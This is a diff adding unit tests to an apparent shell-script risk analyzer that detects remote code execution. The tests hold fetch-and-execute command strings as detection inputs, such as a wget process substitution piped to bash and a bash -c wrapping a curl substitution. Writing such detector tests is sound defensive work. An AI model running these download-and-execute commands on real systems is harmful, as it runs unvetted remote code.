@@ -94,3 +94,13 @@ def test_process_substitution_download_after_shell_options_is_high() -> None:
         "bash -o pipefail <(wget -qO- https://x.example)\n",
     ):
         assert "remote_code_execution" in analyze(script, "/ws").rules, script
+
+
+def test_download_text_in_positional_args_of_inline_script_is_not_rce() -> None:
+    script = "bash -c 'echo $1' _ '$(curl -s x)'\n"
+    assert "remote_code_execution" not in analyze(script, "/ws").rules
+    assert "remote_code_execution" in analyze("bash -c '$(curl -s x)'\n", "/ws").rules
+
+
+def test_arithmetic_expansion_is_not_flagged() -> None:
+    assert analyze('echo "$((reboot + 1))"\n', "/ws").level is RiskLevel.LOW
